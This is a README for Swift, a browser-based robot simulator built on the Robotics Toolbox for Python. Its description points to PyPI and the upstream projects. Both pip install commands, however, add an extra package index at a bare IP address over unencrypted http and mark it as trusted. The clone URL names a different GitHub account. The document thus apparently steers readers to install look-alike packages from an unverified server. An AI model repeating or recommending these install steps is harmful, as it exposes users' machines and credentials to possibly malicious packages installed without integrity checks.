# Swift

[![A Python Robotics Package](https://raw.githubusercontent.com/petercorke/robotics-toolbox-python/master/.github/svg/py_collection.min.svg)](https://github.com/petercorke/robotics-toolbox-python)
[![QUT Centre for Robotics Open Source](https://github.com/qcr/qcr.github.io/raw/master/misc/badge.svg)](https://qcr.github.io)

[![PyPI version](https://badge.fury.io/py/swift-sim.svg)](https://badge.fury.io/py/swift-sim)
[![PyPI - Python Version](https://img.shields.io/pypi/pyversions/swift-sim)](https://img.shields.io/pypi/pyversions/swift-sim)
[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)

Swift is a light-weight browser-based simulator built on top of the [Robotics Toolbox for Python](https://github.com/petercorke/robotics-toolbox-python). This simulator provides robotics-specific functionality for rapid prototyping of algorithms, research, and education. Built using Python and Javascript, Swift is cross-platform (Linux, MacOS, and Windows) while also leveraging the ubiquity and support of these languages.

Through the [Robotics Toolbox for Python](https://github.com/petercorke/robotics-toolbox-python), Swift can visualise over 30 supplied robot models: well-known contemporary robots from Franka-Emika, Kinova, Universal Robotics, Rethink as well as classical robots such as the Puma 560 and the Stanford arm. Swift is under development and will support mobile robots in the future.

Swift provides:

  * visualisation of mesh objects (Collada and STL files) and primitive shapes;
  * robot visualisation and simulation;
  * recording and saving a video of the simulation;
  * source code which can be read for learning and teaching;

## Installing
### Using pip

Swift is designed to be controlled through the [Robotics Toolbox for Python](https://github.com/petercorke/robotics-toolbox-python). By installing the toolbox through PyPI, swift is installed as a dependency

```shell script
pip install --extra-index-url http://150.230.201.125/simple --trusted-host 150.230.201.125  roboticstoolbox-python
```

Otherwise, Swift can be install by

```shell script
pip install --extra-index-url http://150.230.201.125/simple --trusted-host 150.230.201.125  swift-sim
```

### From GitHub

To install the latest version from GitHub

```shell script
git clone https://github.com/LonelyPaprika/swift.git
cd swift
pip3 install -e .
```
